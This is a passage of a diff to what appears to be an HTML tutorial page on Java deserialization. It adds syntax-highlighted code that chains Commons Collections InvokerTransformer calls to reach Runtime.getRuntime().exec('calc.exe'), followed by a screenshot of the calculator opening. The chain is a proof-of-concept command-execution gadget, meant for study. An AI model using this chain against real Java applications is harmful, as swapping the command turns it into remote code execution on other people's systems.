+        <span style="color: #cf8e6d;">InvokerTransformer</span> transformer = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"getMethod"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">String</span>.<span style="color: #cf8e6d;">class</span>, <span style="color: #cf8e6d;">Class</span>[].<span style="color: #cf8e6d;">class</span>}, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[]{<span style="color: #6aab73;">"getRuntime"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[<span style="color: #b3ae60;">0</span>]});
+        <span style="color: #cf8e6d;">InvokerTransformer</span> tr3 = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"invoke"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">Object</span>.<span style="color: #cf8e6d;">class</span>, <span style="color: #cf8e6d;">Object</span>[].<span style="color: #cf8e6d;">class</span>}, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[]{<span style="color: #b3ae60;">null</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[<span style="color: #b3ae60;">0</span>]});
+        <span style="color: #cf8e6d;">InvokerTransformer</span> tr4 = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"exec"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">String</span>.<span style="color: #cf8e6d;">class</span>}, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">String</span>[]{<span style="color: #6aab73;">"calc.exe"</span>});
+        <span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(tr.<span style="color: #56a8f5;">transform</span>(<span style="color: #6aab73;">"RANDOMSTRING"</span>).<span style="color: #56a8f5;">getClass</span>().<span style="color: #56a8f5;">getName</span>());
+        <span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(transformer.<span style="color: #56a8f5;">transform</span>(<span style="color: #cf8e6d;">Runtime</span>.<span style="color: #cf8e6d;">class</span>).<span style="color: #56a8f5;">getClass</span>().<span style="color: #56a8f5;">getName</span>());
+        <span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(tr3.<span style="color: #56a8f5;">transform</span>(transformer.<span style="color: #56a8f5;">transform</span>(<span style="color: #cf8e6d;">Runtime</span>.<span style="color: #cf8e6d;">class</span>)).<span style="color: #56a8f5;">getClass</span>().<span style="color: #56a8f5;">getName</span>());
+        <span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(tr4.<span style="color: #56a8f5;">transform</span>(tr3.<span style="color: #56a8f5;">transform</span>(transformer.<span style="color: #56a8f5;">transform</span>(<span style="color: #cf8e6d;">Runtime</span>.<span style="color: #cf8e6d;">class</span>))).<span style="color: #56a8f5;">getClass</span>().<span style="color: #56a8f5;">getName</span>());
     }
-}
-
-
-
-        </code>
-    </pre>
-</p>
+}</pre></div>
 <p>
     <img src="images/cc/calculatorpopedUp.PNG">
 </p>
